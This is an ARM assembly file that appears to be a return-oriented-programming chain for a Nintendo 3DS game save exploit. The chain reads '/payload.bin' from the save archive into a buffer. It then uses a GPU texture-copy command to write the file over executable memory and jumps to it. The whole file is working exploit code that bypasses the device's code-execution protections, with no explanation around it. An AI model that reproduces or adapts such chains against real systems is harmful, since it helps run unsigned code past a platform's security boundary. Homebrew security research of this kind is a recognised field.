rop:
	set_lr ROP_IRON_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_IRON_POP_R0PC
		.word IRON_FS_HANDLE ; r0 (fs handle)
	.word ROP_IRON_POP_R1PC
		.word SAVE0_BUFFER_PTR + file_handle ; r1 (file handle)
	.word ROP_IRON_POP_R2R3R4R5R6PC
		.word 0x00000000 ; r2 (transaction)
		.word 0x00000004 ; r3 (archive id)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word IRON_FSUSER_OPENFILEDIRECTLY
		.word 0x00000001 ; sp+0 : archive_path_type (PATH_EMPTY)
		.word DUMMY_PTR ; sp+4 : *archive_path
		.word 0x00000001 ; sp+8 : archive_path_length
		.word 0x00000003 ; sp+0xC : path_type (PATH_CHAR)
		.word SAVE0_BUFFER_PTR + file_path ; sp+0x10 : *path
		.word file_path_end - file_path ; sp+0x14 : pathlength
		.word 0x00000001 ; sp+0x18 : openflags
		.word 0x00000000 ; sp+0x1c : attributes

	set_lr ROP_IRON_POP_R4R5PC
	.word ROP_IRON_POP_R0PC
		.word SAVE0_BUFFER_PTR + file_handle ; r0 (file handle)
	.word ROP_IRON_POP_R1PC
		.word DUMMY_PTR ; r1 (bytes read)
	.word ROP_IRON_POP_R2R3R4R5R6PC
		.word 0x00000000 ; r2 (offset low)
		.word 0x00000000 ; r3 (offset high)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word IRON_FSUSER_READ
		.word LINEAR_BUFFER ; sp+0 : *outbuf
		.word 0x00002000 ; sp+4 : size

	flush_dcache LINEAR_BUFFER, 0x2000

	set_lr ROP_IRON_NOP
	.word ROP_IRON_POP_R0PC ; pop {r0, pc}
		.word 0x00349C40 + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_IRON_POP_R1PC ; pop {r1, pc}
		.word SAVE0_BUFFER_PTR + gxCommandPayload ; r1 (cmd addr)
	.word IRON_GSPGPU_GXTRYENQUEUE

	sleep 100*1000*1000, 0

	.word PAYLOAD_VA

	.word 0xDEAF0000

.align 0x4
	file_handle:
		.word 0x00000000

	gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word LINEAR_BUFFER ; source address
		.word 0x37a00000 + PAYLOAD_VA - 0x00100000 ; destination address (standin, will be filled in)
		.word 0x00002000 ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused

	file_path:
		.ascii "/payload.bin"
		.byte 0x00
		file_path_end:
